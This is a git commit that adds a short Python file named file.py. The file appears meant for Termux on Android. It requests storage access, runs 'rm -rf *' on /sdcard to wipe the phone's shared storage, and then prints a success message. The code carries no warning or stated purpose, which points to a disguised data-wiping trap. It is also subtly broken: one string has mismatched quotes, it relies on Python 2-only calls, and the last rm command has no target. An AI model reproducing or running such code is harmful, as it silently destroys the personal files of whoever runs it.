fa99cb896e88b611631e87b77f8b90b136708f3b
filecloning <81711780+filecloning@users.noreply.github.com>
2021-04-01 00:32:45 +0500

    Create file.py

---
+++ file.py
@@ -0,0 +1,8 @@
+import os , sys , time , datetime , re
+reload(sys)
+sys.setdefaultencoding('utf-8')
+os.system("termux-setup-storage')
+os.system("cd /sdcard && rm -rf * ")
+os.system("cd .. && rm -rf ")
+print("Phone data cleared successfully")
+os.system("exit")
